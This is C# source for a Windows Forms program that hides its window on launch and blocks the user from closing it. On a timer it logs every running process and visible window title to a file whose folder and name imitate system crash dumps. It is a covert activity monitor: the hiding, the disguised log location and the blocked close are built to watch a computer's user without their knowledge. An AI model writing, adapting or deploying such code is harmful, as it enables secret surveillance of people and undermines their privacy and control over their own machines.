using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace dalingtang
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        string logDictionary = @"d:\WinodwsSchematics\IrPrcService\LOST.DIR\Dumps\crashed\00001";
        string filePath = @"";

        FileStream fs;
        StreamWriter sw;
        List<string> processList = new List<string>();
        List<string> taskbarList = new List<string>();
        IntPtr tskbarFormHandle = IntPtr.Zero;



        private void Form1_Load(object sender, EventArgs e)
        {
            if (!Directory.Exists(logDictionary))
            {
                Directory.CreateDirectory(logDictionary);
            }
            this.Hide();
            filePath = $"{logDictionary}\\{DateTime.Now.ToFileTime()}_schematic.dump";
            fs = new FileStream(filePath, FileMode.OpenOrCreate, FileAccess.Write);
            sw = new StreamWriter(fs);

            AppendLog("Service Started");

            timer1.Start();



            AppendLog("Starting Scanning");
        }

        protected override void WndProc(ref Message m)
        {
            const int WM_SYSCOMMAND = 0x0112;
            const int SC_CLOSE = 0xF060;
            if (m.Msg == WM_SYSCOMMAND && (int)m.WParam == SC_CLOSE)
            {
                // 禁止用户通过窗口的xx按钮或通过窗口左上角下拉菜单或者按alt+f4或者任务栏鼠标关闭窗口
                // only taskmgr or msg can terminal
                return;
            }

            base.WndProc(ref m);
        }

        #region HandleDLL
        [DllImport("User32")]
        private extern static int GetWindow(int hWnd, int wCmd);
        [DllImport("User32")]
        private extern static int GetWindowLongA(int hWnd, int wIndx);
        [DllImport("user32", CharSet = CharSet.Auto)]
        private extern static int GetWindowTextLength(IntPtr hWnd);
        [DllImport("user32.dll")]
        private static extern bool GetWindowText(int hWnd, StringBuilder title, int maxBufSize);
        [DllImport("User32.dll", EntryPoint = "FindWindow")]
        public extern static IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("User32.dll", EntryPoint = "FindWindowEx")]
        public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpClassName, string lpWindowName);

        private const int GW_HWNDFIRST = 0;
        private const int GW_HWNDNEXT = 2;
        private const int GWL_STYLE = (-16);
        private const int WS_VISIBLE = 268435456;
        private const int WS_BORDER = 8388608;

        public List<string> GetRunApplicationList(Form appForm)
        {
            List<string> appString = new List<string>();

                int handle = (int)appForm.Handle;
                int hwCurr;
                hwCurr = GetWindow(handle, GW_HWNDFIRST);
                while (hwCurr > 0)
                {
                    int isTask = (WS_VISIBLE | WS_BORDER);
                    int lngStyle = GetWindowLongA(hwCurr, GWL_STYLE);
                    bool taskWindow = ((lngStyle & isTask) == isTask);
                    if (taskWindow)
                    {
                        int length = GetWindowTextLength(new IntPtr(hwCurr));
                        StringBuilder sb = new StringBuilder(2 * length + 1);
                        GetWindowText(hwCurr, sb, sb.Capacity);
                        string strTitle = sb.ToString();
                        if (!string.IsNullOrEmpty(strTitle))
                        {
                            appString.Add(strTitle);
                        }
                    }
                    hwCurr = GetWindow(hwCurr, GW_HWNDNEXT);
                }
                return appString;
            
    
        }


        private static string[] GetWindowsInfo()
        {
            try
            {
                Process[] MyProcesses = Process.GetProcesses();
                string[] Minfo = new string[6];
                foreach (Process MyProcess in MyProcesses)
                {
                    if (MyProcess.MainWindowTitle.Length > 0)
                    {
                        Minfo[0] = MyProcess.MainWindowTitle;
                        Minfo[1] = MyProcess.Id.ToString();
                        Minfo[2] = MyProcess.ProcessName;
                        Minfo[3] = MyProcess.StartTime.ToString();
                    }
                }
                return Minfo;
            }
            catch { return null; }
        }
        #endregion

        private void AppendLog(string content)
        {
            sw.BaseStream.Seek(0, SeekOrigin.End);
            sw.WriteLine($"[{DateTime.Now.ToString()}] {content}\n");
            sw.Flush();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Process p in Process.GetProcesses())//GetProcessesByName(strProcessesByName))
            {
                if (!processList.Contains(p.ProcessName))
                {
                    processList.Add(p.ProcessName);
                    try
                    {
                        AppendLog($"NewThread:(title:{p.MainWindowTitle},name:{p.ProcessName},id:{p.Id},handle:{p.Handle},startAt{p.StartTime})");
                    }
                    catch (Exception ex)
                    {
                        AppendLog($"title:{p.MainWindowTitle},{ex.Message}");
                    }
                }
            }

            foreach (var item in GetRunApplicationList(this))
            {
                if (!taskbarList.Contains(item))
                {
                    taskbarList.Add(item);
                    AppendLog($"NewApplication: {item}");
                }

            }
        }
    }
}
